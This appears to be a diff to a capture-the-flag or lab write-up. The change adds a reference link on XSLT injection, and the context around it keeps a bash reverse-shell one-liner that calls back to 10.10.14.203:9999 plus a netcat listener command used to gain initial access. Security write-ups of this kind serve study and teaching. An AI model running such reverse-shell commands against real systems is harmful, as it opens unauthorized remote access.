@@ -62,6 +62,8 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.203/9999 0>&1'
 
 Then we ran a netcat listener: `nc -nlvp 9999`.
 
+> Note: For more information on XSLT injection, see [XSLT Injection — PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/).
+
 This gave us initial access, as shown below:
 
 ![Icon](Images/xsltrevshell.png)
